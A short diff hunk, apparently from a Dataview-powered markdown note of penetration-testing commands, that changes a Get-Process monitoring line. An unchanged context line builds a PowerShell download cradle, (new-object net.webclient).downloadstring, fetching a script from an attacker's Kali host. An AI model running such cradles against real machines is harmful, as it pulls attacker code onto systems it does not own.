@@ -9,6 +9,6 @@ const command = `(new-object net.webclient).downloadstring('http://${KaliIP}/Wat
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 ```
-Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
+Get-Process {backup} -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
 ```
 
